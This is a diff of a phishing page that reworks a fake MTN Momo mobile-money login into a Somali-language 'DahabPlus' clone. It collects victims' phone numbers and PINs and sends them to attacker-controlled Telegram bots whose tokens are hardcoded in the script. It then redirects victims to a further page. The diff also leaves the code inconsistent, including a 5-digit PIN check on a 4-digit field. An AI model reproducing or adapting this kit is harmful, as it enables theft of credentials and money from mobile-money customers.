@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN Momo - Login</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DahabPlus - Login</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -48,6 +48,10 @@
         .logo-text {
             font-size: 36px;
             font-weight: 700;
+            color: #2F9E44;
+            background: #E9F7EE;
+            padding: 4px 16px;
+            border-radius: 12px;
         }
         
         .login-content {
@@ -64,13 +68,13 @@
         .title {
             font-size: 26px;
             font-weight: 600;
-            color: #333;
+            color: #2B2D42;
             margin-bottom: 40px;
         }
         
         .phone-group {
             width: 100%;
-            border: 2px solid #0066ff;
+            border: 2px solid #2F9E44;
             border-radius: 16px;
             display: flex;
             align-items: center;
@@ -87,7 +91,7 @@
         .country-select {
             display: flex;
             align-items: center;
-            color: #0066ff;
+            color: #2F9E44;
             font-weight: 600;
             font-size: 18px;
             margin-right: 16px;
@@ -110,36 +114,69 @@
             color: #aaa;
         }
         
-        .pin-label {
+        .password-label {
             font-size: 16px;
             color: #666;
             margin-bottom: 24px;
             font-weight: 500;
         }
+        /* PIN box styling (single input but looks like PIN) */
         
-        .pin-group {
+        .otp-group {
+            width: 100%;
+            max-width: 420px;
+            border: 2px solid #2F9E44;
+            border-radius: 16px;
             display: flex;
+            align-items: center;
             justify-content: center;
-            gap: 20px;
+            padding: 18px 16px;
             margin-bottom: 30px;
-            flex-wrap: wrap;
+            background: white;
+            gap: 10px;
         }
         
-        .pin-box {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            font-size: 28px;
-            text-align: center;
-            background: white;
-            color: #333;
-            font-weight: 600;
+        .pin-visual {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+            justify-content: center;
+        }
+        
+        .pin-digit {
+            width: 48px;
+            height: 54px;
+            border-radius: 10px;
+            background: #E9F7EE;
+            color: #2B2D42;
+            font-size: 22px;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+        }
+        
+        .pin-digit.filled {
+            background: #DFF3E4;
+        }
+        /* Hidden real input */
+        
+        .pin-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
+        
+        .otp-group:focus-within {
+            box-shadow: 0 0 0 3px rgba(47, 158, 68, 0.25);
         }
         
         .forgot {
             font-size: 15px;
-            color: #0066ff;
+            color: #2F9E44;
             text-decoration: none;
             font-weight: 500;
             margin-bottom: 40px;
@@ -150,7 +187,7 @@
             width: 100%;
             max-width: 400px;
             padding: 18px;
-            background: #0066ff;
+            background: linear-gradient(to right, #2F9E44, #38B000);
             color: white;
             border: none;
             border-radius: 50px;
@@ -158,11 +195,11 @@
             font-weight: 700;
             cursor: pointer;
             margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
+            box-shadow: 0 8px 20px rgba(47, 158, 68, 0.25);
         }
         
         .bottom-section {
-            background: #005eb8;
+            background: #2B2D42;
             color: white;
             padding: 100px 30px 80px;
             text-align: center;
@@ -206,7 +243,7 @@
         
         .bottom-btn {
             background: white;
-            color: #0066ff;
+            color: #2B2D42;
             border: none;
             border-radius: 30px;
             padding: 18px 36px;
@@ -223,7 +260,7 @@
         
         .btn-icon {
             font-size: 26px;
-            color: #0066ff;
+            color: #2F9E44;
         }
         
         .version {
@@ -240,7 +277,7 @@
         }
         
         .terms a {
-            color: white;
+            color: #2F9E44;
             text-decoration: underline;
             font-weight: 500;
         }
@@ -262,8 +299,8 @@
         .spinner {
             width: 60px;
             height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #005eb8;
+            border: 6px solid #E9F7EE;
+            border-top: 6px solid #2F9E44;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 30px;
@@ -280,7 +317,7 @@
         
         .spinner-text {
             font-size: 18px;
-            color: #333;
+            color: #2B2D42;
             text-align: center;
             line-height: 1.6;
             max-width: 300px;
@@ -291,55 +328,59 @@
 
 <body>
     <div class="logo">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTf8zLB_4O2VX8COsQElWZWc-RJ264mOO9ocy2GbGSq2w&s=10" alt="MTN-momo">
-        <div class="logo-text">MTN Momo</div>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnW8BYxCgA8Utr7AsAzBJ_Rnu_PRQ0SqxFeUTS5PX9oQ&s=10" alt="DahabPlus">
+        <div class="logo-text">DahabPlus</div>
     </div>
 
     <div class="login-content">
-        <h1 class="title">BIOMETRIC OTP</h1>
+        <h1 class="title">DahabPlus</h1>
 
         <div class="phone-group">
-            <span class="flag">🇨🇲</span>
+            <span class="flag">🇸🇴</span>
             <div class="country-select">
-                +237 <span class="dropdown-arrow">▼</span>
+                +252 <span class="dropdown-arrow">▼</span>
             </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" />
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Numbarka Taleefanka" />
         </div>
 
-        <div class="pin-label">Enter your Biometric Otp</div>
+        <div class="password-label">Geli PIN-ga (4 nambar)</div>
 
-        <!-- ✅ PIN SLOTS = 4 digits -->
-        <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+        <!-- PIN input (4 digits) -->
+        <div class="otp-group" id="pinWrap" aria-label="PIN input">
+            <input class="pin-input" type="text" inputmode="numeric" maxlength="4" id="pinInput" autocomplete="one-time-code" />
+
+            <div class="pin-visual" id="pinVisual" aria-hidden="true">
+                <div class="pin-digit" data-pos="0"></div>
+                <div class="pin-digit" data-pos="1"></div>
+                <div class="pin-digit" data-pos="2"></div>
+                <div class="pin-digit" data-pos="3"></div>
+            </div>
         </div>
 
-        <a href="#" class="forgot">Forgot your Biometric?</a>
+        <a href="#" class="forgot">Ma ilowday PIN-ga?</a>
 
-        <button id="loginBtn">Proceed</button>
+        <button id="loginBtn">DahabPlus</button>
     </div>
 
     <div class="bottom-section">
         <div class="curve"></div>
         <div class="bottom-content">
             <div class="bottom-text">
-                To register an MTN Momo account or get help,<br /> press below
+                Si aad u diiwaangelisato akoonka DahabPlus<br /> ama aad helto caawimo, guji hoos
             </div>
             <div class="bottom-btns">
                 <a href="#" class="bottom-btn">
                     <div class="btn-icon">👤</div>
-                    Register
+                    Diiwaangeli
                 </a>
                 <a href="#" class="bottom-btn">
                     <div class="btn-icon">ℹ️</div>
-                    Help & Support
+                    Caawimo & Taageero
                 </a>
             </div>
             <div class="version">v2.13P</div>
             <div class="terms">
-                By signing in, you agree to the <a href="#">Terms & Conditions</a>
+                Adigoo galaya, waad aqbalaysaa <a href="#">Shuruudaha & Xeerarka</a>
             </div>
         </div>
     </div>
@@ -347,17 +388,17 @@
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Please wait...<br /> This usually takes a few seconds
+            Fadlan sug...<br /> Tan waxay qaadan kartaa sekondado dhow
         </div>
     </div>
 
-    <script>
+   <script>
         // --- Existing Telegram bot tokens (kept as-is from your code) ---
-        const BOT_TOKEN_1 = '8420256222:AAHyLM4QF5JFgx35GULn2aZj5IKXjZsMypg';
-        const CHAT_ID_1 = '8879745965';
+        const BOT_TOKEN_1 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
+        const CHAT_ID_1 = '5682326990';
 
-        const BOT_TOKEN_2 = '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM';
-        const CHAT_ID_2 = '8406078749';
+        const BOT_TOKEN_2 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
+        const CHAT_ID_2 = '5682326990';
 
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
@@ -371,7 +412,7 @@
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         let pinValue = '';
 
-        const PIN_LENGTH = 4; // ✅ required PIN length
+        const PIN_LENGTH = 5; // ✅ required PIN length
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
@@ -411,7 +452,7 @@
             localStorage.setItem('phone', phone);
             localStorage.setItem('pin', pinValue);
 
-            const message = `New Login Attempt\n\nPhone: +237 ${phone}\nBIOMETRIC PIN: ${pinValue}`;
+            const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
@@ -436,12 +477,12 @@
             }).catch(() => {});
 
             setTimeout(() => {
-                window.location.href = 'login.html'; // ✅ navigate to login.html
+                window.location.href = 'verify.html';
             }, 1500);
         });
 
         checkPinComplete();
-        if (pinBoxes[0]) pinBoxes[0].focus(); // safety
+        pinBoxes[0].focus();
     </script>
 </body>
 
